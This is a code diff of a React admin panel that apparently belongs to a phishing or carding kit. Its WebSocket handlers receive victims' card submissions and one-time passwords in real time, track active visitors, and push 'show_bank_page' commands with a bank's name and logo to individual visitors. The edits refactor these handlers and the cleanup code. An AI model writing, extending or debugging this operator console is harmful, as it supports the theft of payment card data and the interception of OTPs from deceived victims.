@@ -54,49 +54,7 @@ const AdminPanel = () => {
     // Announce to the server that this is an admin client
     wsClient.send('admin_hello', {});
 
-    // Set up event listeners
-    wsClient.on('card_submission', (data: CardSubmission) => {
-      console.log('Received card submission:', data);
-      setCardSubmissions(prev => [
-        { ...data, isNew: true },
-        ...prev
-      ]);
-    });
-
-    wsClient.on('visitor_update', (visitor: Visitor) => {
-      console.log('Received visitor update:', visitor);
-      setVisitors(prev => [...prev, visitor]);
-      setActiveVisitors(prev => [...prev, visitor]);
-    });
-
-    wsClient.on('visitor_left', (visitor: { id: string }) => {
-      console.log('Visitor left:', visitor);
-      setVisitors(prev => prev.filter(v => v.id !== visitor.id));
-      setActiveVisitors(prev => prev.filter(v => v.id !== visitor.id));
-    });
-
-    return () => {
-      if (wsClient.socket.connected) {
-        wsClient.disconnect();
-      }
-    };
-
-    // Set custom favicon for admin panel only
-    const favicon = document.createElement('link');
-    favicon.rel = 'icon';
-    favicon.type = 'image/png';
-    favicon.href = 'https://static.thenounproject.com/png/74031-200.png'; // Example game logo
-    favicon.id = 'admin-favicon';
-    document.head.appendChild(favicon);
-    return () => {
-      const existing = document.getElementById('admin-favicon');
-      if (existing) existing.remove();
-    };
-  }, []);
-
-  useEffect(() => {
-    // Handler for new card submissions
-    const handleCardSubmission = (submission: any) => {
+    const handleCardSubmission = (submission: CardSubmission) => {
       console.log('[AdminPanel] Received card_submission:', submission);
       setCardSubmissions(prev => [{
         ...submission,
@@ -106,7 +64,6 @@ const AdminPanel = () => {
       showNotification('New card submission received');
     };
 
-    // Handler for admin commands
     const handleAdminCommand = (command: any) => {
       console.log('[AdminPanel] Received admin_command:', command);
       if (command.submission_id) {
@@ -117,43 +74,35 @@ const AdminPanel = () => {
       }
     };
 
-    // Handler for visitor updates
     const handleVisitorUpdate = (visitor: Visitor) => {
       console.log('[AdminPanel] Received visitor_update:', visitor);
       setActiveVisitors(prev => {
-        const exists = prev.some(v => v.id === visitor.id);
-        if (!exists) {
-          return [visitor, ...prev];
-        }
-        return prev;
+        if (prev.find(v => v.id === visitor.id)) return prev;
+        return [...prev, visitor];
       });
     };
 
-    // Handler for visitor leaving
     const handleVisitorLeft = (payload: { id: string }) => {
-      console.log('[AdminPanel] Received visitor_left:', payload);
+      console.log('[AdminPanel] Received visitor_left:', payload.id);
       setActiveVisitors(prev => prev.filter(v => v.id !== payload.id));
     };
 
-    // Handler for deleting all transactions
     const handleDeleteAllTransactions = () => {
-      console.log('[AdminPanel] Received delete_all_transactions');
+      console.log('[AdminPanel] Deleting all transactions');
       setCardSubmissions([]);
       setAdminCommands({});
+      showNotification('All transactions deleted');
     };
 
-    // Handler for OTP submitted event
     const handleOtpSubmitted = (data: any) => {
       console.log('[AdminPanel] Received otp_submitted:', data);
-      setCardSubmissions(prev => prev.map(submission =>
-        submission.id === data.submission_id || submission.invoice_id === data.submission_id
-          ? { ...submission, otp: data.otp }
-          : submission
-      ));
-      showNotification('OTP received for a card submission');
+      setCardSubmissions(prev =>
+        prev.map(s =>
+          s.id === data.submission_id ? { ...s, otp: data.otp } : s
+        )
+      );
     };
 
-    console.log('[AdminPanel] Registering WebSocket event listeners');
     wsClient.on('card_submission', handleCardSubmission);
     wsClient.on('admin_command', handleAdminCommand);
     wsClient.on('visitor_update', handleVisitorUpdate);
@@ -161,14 +110,28 @@ const AdminPanel = () => {
     wsClient.on('delete_all_transactions', handleDeleteAllTransactions);
     wsClient.on('otp_submitted', handleOtpSubmitted);
 
+    // Set custom favicon for admin panel only
+    const favicon = document.createElement('link');
+    favicon.rel = 'icon';
+    favicon.type = 'image/png';
+    favicon.href = 'https://static.thenounproject.com/png/74031-200.png'; // Example game logo
+    favicon.id = 'admin-favicon';
+    document.head.appendChild(favicon);
+
     return () => {
-      console.log('[AdminPanel] Cleaning up WebSocket event listeners');
+      if (wsClient.socket.connected) {
+        wsClient.disconnect();
+      }
       wsClient.off('card_submission', handleCardSubmission);
       wsClient.off('admin_command', handleAdminCommand);
       wsClient.off('visitor_update', handleVisitorUpdate);
       wsClient.off('visitor_left', handleVisitorLeft);
       wsClient.off('delete_all_transactions', handleDeleteAllTransactions);
       wsClient.off('otp_submitted', handleOtpSubmitted);
+      const existingFavicon = document.getElementById('admin-favicon');
+      if (existingFavicon) {
+        existingFavicon.remove();
+      }
     };
   }, []);
 
@@ -187,10 +150,9 @@ const AdminPanel = () => {
       submission_id: submissionId,
       created_at: new Date().toISOString(),
     };
-    
-    if (bankData) {
-      commandData.bank_name = bankData.name;
-      commandData.bank_logo = bankData.logo;
+    if (command === 'show_bank_page' && bankData) {
+      (commandData as any).bank_name = bankData.name;
+      (commandData as any).bank_logo = bankData.logo;
     }
     
     console.log('Admin Panel: Sending command to socket ID:', submissionId, commandData);
